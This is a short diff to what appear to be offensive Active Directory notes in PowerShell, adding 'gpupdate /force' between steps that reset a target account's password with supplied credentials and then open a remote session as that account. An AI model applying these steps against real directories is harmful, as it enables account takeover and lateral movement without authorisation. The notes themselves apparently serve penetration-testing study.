@@ -266,6 +266,8 @@ $password = ConvertTo-SecureString "<password>" -AsPlainText -Force
 $cred = New-Object System.Management.Automation.PSCredential ("<ADAccount>", $password )
 # using same password to change target user's password
 Set-ADAccountPassword -Identity "<Target ADAccount>" -Reset -NewPassword $password -Credential $cred
+# access denied 
+gpupdate /force
 
 # we can use Enter-PSSession to connect to target host
 $cred = New-Object System.Management.Automation.PSCredential ("<Target ADAccount>", $password )
